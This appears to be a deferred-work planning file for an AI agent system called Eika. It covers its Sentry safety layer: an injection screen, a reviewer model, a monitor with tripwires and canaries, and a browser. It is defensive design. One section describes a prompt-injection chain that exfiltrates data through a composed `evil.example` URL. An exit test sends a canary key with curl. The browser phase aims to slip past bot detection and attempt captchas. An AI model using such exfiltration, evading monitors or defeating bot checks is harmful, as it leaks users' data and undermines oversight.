# Deferred work

What was cut from `PLAN.md` on 2026-11-01, kept here so it can come back. The
reasons are in `DECISIONS.md` ("What the first version leaves out"). On 2026-11-09
the injection screen went back into the plan and labels were dropped
(`DECISIONS.md`, "Safety without asking"), and this file was brought in line.

Nothing here is started until its trigger fires. When one does, move the work
into `PLAN.md` as a phase or items, then follow the plan's rules. The design for
most of it stays in `design/`, marked deferred. Items below keep their wording
from the plan, written when Sentry was a separate container, so read them with
the notes under "How it returns", which override them.

## Return order and triggers

| Order | Work | Bring it back when |
|---|---|---|
| 1 | Channels (phase 14) | The web app is in daily use and you want Eika in the chat app you already use. Matrix-Bot gives it a head start |
| 2 | Reviewer (phase 8) | Plugin approvals become annoying, as measured from `audit` rows, and "always" on the card does not cover them |
| 3 | Dreaming (phase 9) | The memory index goes over budget in real use, and stays there |
| 4 | Tighter rules ("Rules that tighten safety without asking", below) | `evals/injection` or real use shows an attack chain getting through |
| 5 | Browser and vault (phases 12, 10) | A recurring task that no plugin or `web_fetch` can do |
| 6 | Monitor (phase 13) | The reviewer has real decisions behind it, and the audit log shows misses |
| Paired | Sentry's own container and the Docker socket proxy | You want Core to stop being root-equivalent on the host. One without the other buys little |
| Any time | Hardening (phase 15), Web Push | Named below |

## Sentry as its own container

Sentry is `internal/sentry`, inside Core. A separate process only protects
against a compromised Core, and Core's Docker socket can reach Sentry's volumes
anyway, so the container and the socket proxy pay off together or not at all.

- `cmd/eika-sentry` and the `eika-sentry` container. Compose changes:
  - networks `eika_egress`, `eika_browser_ctl` and `eika_browser_internal`, and
    the socket volume
  - Postgres roles `eika_core` and `eika_sentry` with schemas `core` and `sentry`,
    set up by an init script, which runs only on an empty data directory, so this
    means a database reset or a written migration
  - Sentry's own migrator
- `internal/sentry/api` wire types and `docs/api/sentry.md`, generated and checked
  like `contract.json`.
- Move `internal/egress` and `internal/netguard` into Sentry, with the principals
  API.
- Move `mcp.Pool` into a Sentry plugin host, splitting `internal/mcp`'s `tool.Tool`
  adapters out of `mcp/tools.go` first. OAuth runs through `/v1/user/*`, with tokens
  in the vault. Core's MCP routes move or proxy to Sentry's user routes.
- Approvals checked with `SELECT` on `core.auth_sessions`, and Sentry's event stream
  relayed by Core on `inbox`.
- Benchmarks: `decide` p99 under 2 ms over the socket, proxy overhead under 1 ms.
- A Docker socket proxy in front of Core, allowing only container operations on
  Eika-labelled objects.

## Phase 8: System One models and scanning

### How it returns

The phase splits in two, and they return separately.

**Reviewer.** The plan had it in phase 4 on an emulated chat model. It returns
talking only to `/v1/systemone`, on the d3-flash the bench already runs: the design's
numbers have emulation allowing 50% of steered attacks against d3-flash's 17%. Leave
out emulation, Laya, OpenDecider and hosted Jev. Drop the `reversible` question,
which no verdict reads. Its job is narrower than it was: plugin tools set to `ask`
get a `review` verdict first, and the user is asked only when the reviewer is
unsure. It does not bring back asks for fetches or commands, and there are no
labels for it to read. `decision` is already a model kind and a class, and nothing
calls it. The items are:

- `internal/systemone`: wire types, thresholds and a client for any `/v1/systemone`
  endpoint. The wire types follow what llama.cpp serves, checked against the bench:
  a choice question carries a `criteria` object (option to description), and answers
  come back as `{"noul": p}` and `{"choice", "probabilities", "confidence"}`.
- Reviewer: isolated state capped at 16k tokens (a setting), its questions and
  user-adjustable thresholds, a 5 s cut-off that becomes `ask`. Turn on the `review`
  verdict for plugin tools set to `ask`.
- A live suite: the reviewer on the bench's d3-flash, over a fixed set of benign and
  dangerous plugin calls (a reply to the sender versus a forward of the inbox to a
  new address) plus their steered variants; verdicts, p50 latency and the 5 s
  cut-off recorded.
- Settings warns when `decision` shares a pool with `main` without a spare slot.

**Injection screen.** No longer deferred. It is phase 4 of the plan, as the `guard`
service, and it removes what it flags instead of setting a label
(`design/sentry.md` 6). What stays here from the old phase is the suite behind the
model recommendation (`evals/screen`, below as `evals/sentry/screen`), for when
another model or revision is to be checked.

### Items as planned

Design: `design/sentry.md` sections 6 and 9. The items on the `guard/` sidecar,
ingest, the screen at skill install and routine creation, `evals/sentry` and the
live suite are in the plan now (phases 4, 6, 7 and `evals/injection`), without the
`suspicious` flag. They stay below as they were written.

- Extend `internal/systemone` (added in phase 4): hosted Jev and
  `laya-serve`, and probing.
  - probing tells a decision model from a chat model by `"decisions"` in
    llama.cpp's `/v1/models` `output_modalities`. The bench's llama.cpp
    (b11941) does not report it yet, so probing falls back to a one-question
    `/v1/systemone` call and reads the error or the answer
- `guard/` sidecar (Python, compose profile `guard`): the injection
  classifier endpoint and `laya-serve`. Show its health in Settings. The
  screen's flag threshold is a setting; `design/sentry.md` 6 ("Injection
  screen model") gives the recommended model and its threshold.
- Ingest:
  - the injection screen (chunking, bounded sampling of large content)
  - the `suspicious` flag
  - alerts
  - one-time code and sign-in link removal for browser sources
- The reviewer's stricter thresholds for `suspicious` sessions, now that the screen
  sets the flag.
- Use the screen when a skill is installed and when a routine is created.
- Notification urgency `needs_attention_now` on `decision`.
- Hosted Jev may not see `sensitive` state unless the user opts in.
- `evals/sentry`: the innocent, injected and over-reach suites. Record attack
  success, utility and approval rate per model, and the asks per active day
  by source. Run on the bench: the chat model on the 5090, the screen and
  d3-flash on the 3090.
- Phase 8 live suite: ingest against the bench's guard (fixture pages flagged
  and wrapped at the 0.9 threshold, benign ones not; the guard stopped
  mid-run gives `unscanned`, never a drop), and the reviewer's `suspicious`
  thresholds on d3-flash.
- `evals/systemone`: the decision-model suite behind the recommendation in
  `design/sentry.md` 9 ("Decision model"), for checking any other model,
  quantisation or revision.
  - the reviewer's questions on AgentDojo actions and Eika-shaped cases,
    with matched pairs, steering variants and the actions Sentry hands off
    kept apart
  - monitor trajectories that follow an injection, ignore it, or carry out an
    unusual legitimate request
  - `needs_attention_now`, routing and the memory checks
  - verdicts at the reviewer's thresholds, AUROC, pair ranking, ECE, p50
    latency and VRAM per model
- `evals/sentry/screen`: the injection screen's suite behind the
  recommendation in `design/sentry.md` 6 ("Injection screen model"), for
  checking any other model or revision.
  - adaptive and planted attacks (LLMail-Inject, InjecAgent, AgentDojo,
    BIPIA, JailbreakBench) and benign web, email, repository markdown and
    attack-discussion pages, near-duplicates removed, with each model's
    training-set overlap excluded
  - per-subset recall at the threshold that gives 1% false positives
  - the window-boundary split and counterfeit-policy steering tests
  - latency per window on GPU and on CPU

**Exit:**
- Injected content on a fixture page is flagged and wrapped.
- On the eval set, the reviewer allows benign actions and denies or asks on
  dangerous ones.
- The numbers are in the log.

## Phase 9: Dreaming

### How it returns

Before building the phase, try a plain routine that asks `eika` to tidy memory with
the tools it has. Dreaming needs `use_count` and `last_used_at`, which `core.memories`
does not record for now. The routine is shipped enabled only once it has been
watched for a while.

### Items as planned

Design: `design/memory.md` section 7.

- `dreamer` agent:
  - the tools `memory_list`, `memory_merge` and `memory_archive`
  - the phased prompt
  - a report file
  - one commit per dream
  - a home notice
- Dream routine, shipped enabled. Triggers: `dream_min_entries` new entries
  since the last dream (entries, not sessions, since the home session never
  ends), an over-budget index, idle pool.
- Guardrails:
  - no egress principal for dream sessions
  - changes to user-provenance memories become Inbox proposals
  - the `dream_mode` setting
  - pending memories are never promoted
- "Undo last dream" (a revert) in the UI.
- Pre-classify merge candidates and contradictions with `decision`.
- Prune by `use_count`, `last_used_at` and `expires`.
- `evals/memory` stress suite.

**Exit:** after a scripted week of history, a dream:
- merges duplicates
- turns relative dates into absolute ones
- archives expired memories
- proposes a change to a user memory instead of making it
- writes its report

Undo restores everything.

## Phase 10: Vault and surrogates

### How it returns

It returns with the browser, or when a real secret is needed from `bash`. Plugin
credentials do not need it: they stay sealed in Core with `internal/secret`. Leave
out X25519 and WebCrypto in secure entry. Core serves the page that would do the
encrypting, so it protects nothing a plain pass-through to Sentry with the log test
does not. The canary key in `home` is in phase 4 of the plan and trips on its
literal value in a tool call. What comes with this phase is TLS interception, which
lets the proxy see a key read from the environment, and the vault-looking file.

### Items as planned

Design: `design/sentry.md` section 8.

- Vault entries sealed with Sentry's key. The Vault UI shows names, kinds,
  bound domains and last use, never values. Rotate and delete.
- Secure entry:
  - the `request_secret` tool and an Inbox form
  - X25519 plus AES-GCM in the browser with WebCrypto
  - Core relays ciphertext only
  A test asserts the value never reaches a Core log, a `model_calls` row or
  an entry.
- Surrogates: the format, binding by domain and principal, and the resolution
  API for the plugin host and the browser.
- Redact real vault values on ingest (multi-pattern search).
- TLS interception in Sentry's proxy (moved here from phase 15, since
  surrogates are useless from computers without it and the proxy sees only
  the host of an HTTPS request):
  - a Sentry CA in the sandbox image
  - intercepted hosts: those with bound secrets, plus every host while a
    canary check is enabled for a computer (a setting, on by default)
  - surrogates swapped in headers and bodies
  - surrogates sent to unbound hosts denied with a high alert
  - canaries in headers and bodies caught
  Pinned-certificate clients that reject the CA get a clear proxy error
  and a per-host exemption in Settings.
- Canaries planted at setup, and backfilled on start for existing installs:
  an OpenAI-shaped API key in the `home` environment and a vault-looking
  file. A minimal tripwire halts on any canary in an action's arguments or
  in egress, headers and bodies included; phase 13 builds the full monitor.

**Exit:**
- An agent asks for an API token, and the user enters it on the phone.
- The surrogate appears in the agent's context, and a `curl` from the computer
  to the bound host succeeds with it.
- No log, row or response anywhere in Core contains the real value.
- `curl -H "Authorization: Bearer $OPENAI_API_KEY" https://example.net` (the
  canary read from the environment, not written in the command) halts Eika.

## Phase 12: Browser

### How it returns

Before any of it, try a browser MCP server (Playwright MCP) as a plugin, once
plugins are in. It gets tool settings, approvals and ingest for nothing, and may be
enough for the recurring task that triggered this. Build the service below only for
what that cannot do: the live view, takeover and logins.

In stages, each usable alone:
1. Anonymous and read-only: the service, the container, snapshots, `find` and `read`.
2. The live view.
3. Logins, form decisions, hand-offs and takeover, with phase 10.

`design/browser.md` decides form submits by session label, and labels are gone.
When the phase returns, a submit needs a rule of its own in the "What asks" table,
with a `DECISIONS.md` entry: most likely an ask per site with "always for this
site", and a hand-off for account creation, passwords and payments. Page content
goes through ingest like any other untrusted source. Images in tool results come
back with it.

### Items as planned

Design: `design/browser.md`.

- `browser/` service on Patchright driving headed Chrome on Xvfb:
  - the command set, including `eval`
  - pruned interactive snapshots with refs, budgets, deltas and masking
  - `find` and `read`
  - tabs
  - the download quarantine
  Unit tests run against fixture pages.
- Container (pinned Chrome stable on x86-64 Linux, Xvfb),
  networks, profile volume, hardening and compose.
- A detection check in `evals/browser`: a fixed list of bot-detection test
  pages and captcha-protected fixture sites, run headed against vanilla
  headless Chromium, so a Patchright or Chrome update that regresses shows
  up.
- Sentry relay:
  - `browser` actions
  - form-submit decisions
  - hand-off on account creation, password changes, payments and terms
  - surrogate typing bound to origins
  - the per-site list
- `browser` agent definition, its tools, and the one-task browser lock.
- Images in tool results: a screenshot reaches a vision model as a user
  message after the tool result. Add the `DECISIONS.md` entry, which
  replaces the deferred note.
- Live view: a screencast relayed through Sentry, with input for takeover
  on the same relay, so `browserd` joins only Sentry's networks and Core
  has no path to it. Core relays the UI's socket to Sentry's
  `/v1/user/browser/view`, which checks the user token. The Browser page; a
  phone layout.
- Takeover: the lock, input relay, the return-control notice, and hand-off
  cards with the live view built in.
- Moving a download to a computer, as its own action.
- The `browser.identify` setting.
- A Docker test with a fixture site, and `evals/browser`, run on the bench:
  the browser agent on Qwen3.8-27B with its mmproj, so screenshots reach a
  real vision model through the user-message path.

**Exit:** ask for "three flights to X under $Y". Then:
- A browser task starts.
- The live view works on the phone.
- It logs in through a vault surrogate.
- A sign-up form is handed off.
- Nothing is submitted without approval.
- A simple captcha is attempted by the agent.
- An injected review on a fixture page fails to redirect the task.

## Phase 13: Monitor and auto-halt

### How it returns

After the reviewer. The design's own numbers have the trajectory check flagging 37%
of runs in which the agent correctly ignored an injection. The fine-tune export needs
months of real decisions first.

### Items as planned

Design: `design/sentry.md` sections 9 and 11.

- Core sends turns, reasoning excerpts and tool calls to `/v1/observe`.
- The full list of deterministic tripwires.
- One trajectory check (`malicious_or_dangerous`) with `decision`, run only when a
  tripwire fires or ingest flags an injection. It reads tool results. The
  reasoning review setting (off by default).
- Severity routing and push. Auto-halt on high severity. Resuming can revoke
  the grants of the halted session.
- Approval-fatigue suggestions in the Inbox.
- Decision dataset export (JSONL, Laya format), a fine-tune script outside
  `make check`, and a guide to swapping the result in as the local `decision`
  model.

**Exit:** each scripted misbehaviour scenario raises its expected severity, and a
canary exfiltration halts within one action.

## Phase 14: Channels

### How it returns

First in line. ntfy already moved to phase 3, and it needs nothing else from the
deferred work.

### Items as planned

Design: `design/interface.md` section 6.

- The `Channel` interface, now that a second implementation justifies it. Web
  moves behind it.
- A Discord or Matrix adapter:
  - an allowlist
  - messages feed the one home session, with the channel named in each
    `<context>` and replies sent back to it (runtime.md 7)
  - untrusted attachments
  - approvals and secrets delivered as links to the web Inbox
- Settings page for channels.

**Exit:** a message to Eika on Discord gets a reply there, and an approval arrives
as a link to the web Inbox.

## Phase 15: Hardening and operations

### How it returns

Item by item, when something asks for it. The Docker socket proxy is under "Sentry
as its own container". The last item stays the plan's closing step.

### Items as planned

- Computer hardening: read-only root filesystem where the image allows it, a
  seccomp profile, user-namespace remap documented.
- Extend backup and restore to skills, the browser profile (optional) and
  Sentry's vault, with a tested restore on a clean host.
- Soak test: 72 h always on, with scripted routines and a scripted user. Watch
  memory growth, leaks, queue fairness and prefix-cache hit rate over time.
- Track eval results over time per model in `evals/results/`.
- Threat model review against `design/README.md`, and a self pen-test
  checklist run.
- Final docs: `docs/design/` is empty or holds only deferred items. Delete
  the plan and its log.

## Rules that tighten safety without asking

The plan's safety leaves gaps it names (`design/sentry.md` 6, "What this does not
stop"). When `evals/injection` or real use shows one of them being used, these are
the next steps, in the order to try them. Each is a rule or a narrower capability.
None is an ask.

- **A project on its own computer in allowlist mode.** The project names the hosts
  its worker may reach (a package registry, its git remote), and nothing else
  leaves. This is the answer for a project whose files must not leak. It needs the
  project `computer` field (trimmed from phase 2) and a UI for the allowlist.
- **A URL-provenance rule for `web_fetch`.** A fetch is allowed when its URL came
  from the user, from a search result, or from a page already fetched in the
  session, or when it has no query string and a short path. Anything else, such as
  a URL the model composed with data in it, is denied with a reason. It closes the
  chain where an injected Eika briefs a researcher to fetch
  `https://evil.example/?d=<private data>`. The cost is a false deny on API URLs
  the model builds honestly, so measure it on the live suites first.
- **Screening `bash` output and file reads.** Only for output that came from the
  network, or for all of it, behind a setting. The model was not measured on logs
  and code, so run `evals/screen` on such text first.
- **No `web_fetch` for a researcher started from a session that read plugin
  content.** A capability rule: mail goes in, nothing composed goes out. It is
  coarse, and close to a label, so it is last.

## Trimmed from the kept phases

Each of these can return alone.

### Phase 1: built, kept, and not verified further

All of phase 1's code stays. These were cut before more time went into them:

- The runner-driven live suites: TabbyAPI (needs `EIKA_TABBY_KEY` in `live.env`), the
  `partitioned` run and the `--no-cache-idle-slots` slot affinity run, then the
  `no-cache-idle-slots`, `partitioned`, `-np 1` and `tabbyapi` order the log gives.
  Bring them back when one of those setups is in daily use.
- `evals/bench` stays for them, unused. It has only run against a fake host, and
  `evals/benchctl`, which its error message names, was never built. Build `benchctl`
  before the first real run.
- vLLM, SGLang, TabbyAPI and cloud rows stay marked unverified in
  [Architecture](ARCHITECTURE.md#endpoints-models-and-classes) until such a server
  is on the bench.
- Slot affinity stays off on the bench, since `id_slot` is only sent once its check
  passes, and that needs `--no-cache-idle-slots`.

### Phase 2

- User-defined agents, tool-list overrides, and per-agent `limits`, `access`, `skills`
  and `plugins` fields. Return when a built-in does not fit.
- Per-agent allowed classes and `subagent_start {class}`. Return when one worker
  class is the wrong size for some work. The `deep` class is built, and an agent's
  class can be set to it.
- `wait: true`, depth 2 (`worker -> researcher`), steering a running subagent,
  `subagent_board_days`, and the `report` modes. Return when Eika's flow shows it
  needs them.
- `inbox_ask` and the `questions` table. Return if questions get lost in chat.
- Automatic resumption of runs after a restart, and the `dispatched` marker. Return
  when restarts are common enough for the manual step to hurt.
- From compaction: `[Ledger]`, `[Recent turns]`, and the retry that folds in a
  span whose summary failed. Return if `evals/compaction` (phase 13) shows the
  summary losing commitments. `(#id)` references are in phase 13.
- From history: `pg_trgm` and regular expressions, tool-result indexing and
  `history_read {compaction}`.
- Chapters, behind `evals/compaction` (phase 13).
- Project fields: a computer of its own, `agent`, `skills`, `plugins` and
  `created_by`.

### Phase 3

- Web Push, with its VAPID keys and RFC 8291 code. Return if ntfy is not good enough
  on the phone.
- The setup wizard's phone step and the feature-import ESLint rule.
- The pool and queue strip, the project file listing, the markdown field on touch,
  and phone baselines beyond Chat, Activity and Inbox.
- Virtualising the transcript, unless a measurement asks for it.

### Phase 4

- Labels, all of them: `sensitive`, `private` projects, `suspicious`, and the asks
  they caused before fetches and commands. Dropped, not deferred (`DECISIONS.md`,
  "Safety without asking"). If something like them returns, it returns as a rule
  from the section above, and it must not launder: clearing a label at compaction
  did, since the rolling summary can still hold the private data.
- Grant scopes `routine`, `subagent` and `until`, approval grouping and the push
  digest. They existed to make a labelled session's asks bearable. Return only if
  plugin approvals pile up in a way "always" does not cover.
- Per-run proxy credentials. They only attribute traffic, since no verdict reads
  them. Return with the monitor's volume tripwire.
- The audit timeline UI, export and retention setting, and asks per active day.
- Audit rows for plain allows. The session's events already hold every tool call.
- Outbound detectors beyond credentials: Luhn, account numbers, ID formats. They were
  a hard deny with no override, so Eika could never send the user's own IBAN to their
  accountant. A plugin send already asks, so they return, if at all, as a line on
  its approval card.
- Approvals, grants and tool settings moved to phase 11, where they first have
  anything to act on.

### Phase 5

- Project memory scope, and memory access for subagents. A project's living summary
  is a `STATUS.md` in its directory. Return when briefs prove too thin.
- `sensitivity`. Dropped with labels; only `eika` reads memory.
- `provenance` and the instruction-shape check. The screen on the memory's body
  replaced them (`design/memory.md` 6): a word list with a quote check sends a
  paraphrased preference to pending and passes a planted instruction that avoids
  the words.
- The recall hint. The design's own research says agents with search do as well.
- Score-based index selection, `use_count` and `last_used_at`.
- The types `project`, `decision`, `feedback`, `reference` and `event`.
- Forget by source, per-file history with diff and revert in the UI (git keeps the
  history), and the "what Eika loads" view.
- `evals/memory`, beyond the poisoning scenario.

### Phase 11

- Per-plugin cells with their own egress principals. Return when one stdio plugin
  should not share a computer with another.
- Pinned plugin tools, schema validation before a call (the server rejects bad
  arguments anyway), resources through `plugin_call`, and the most-used ranking.
- Plugin notifications as triggers, and forgetting memories on disconnect.
- The `private` plugin flag. Dropped with labels. `trusted` is in the plan: a
  trusted plugin's results are scored but never have anything removed.
- Plugins for subagents.

### Phase 7

- Webhook, file and interval triggers. Return when a routine should react to
  something rather than to the clock.
- The `continue` and `nudge` contexts.
- `precheck`, `NO_REPLY` and `report` modes. Return with the Check-in routine.
- Active hours, idle-only, the `blocked` pre-flight and natural-language parsing in
  the UI.
- Urgency judging (`needs_attention_now`).
- The Check-in routine, disabled by default.
- The `routine` grant scope. A routine's runs follow the same rules as any other
  run, and a plugin tool it needs is set to `allow` or pinned from its first card.

### Phase 6

- Installing from a folder, a pasted `SKILL.md`, a git URL or a path on `home`.
- Project scope and assigning skills to agents.
- `skill_file` (a worker reads the file on the computer), `/name` in the composer,
  skill bodies re-attached after compaction, the names-only mode above 40 skills,
  repeat-activation deduplication, and notices for skills installed mid-session.
- `allowed-tools` as grants, and skill proposals.

### Other ideas already deferred

- **Per-value capability tracking (CaMeL):** only if the rules above it in this
  file prove too coarse.
- **Chapters for home compaction**, behind `evals/compaction`.
- **Voice and an email address for Eika:** after channels.
- **Several browser identities and profiles:** after the browser.
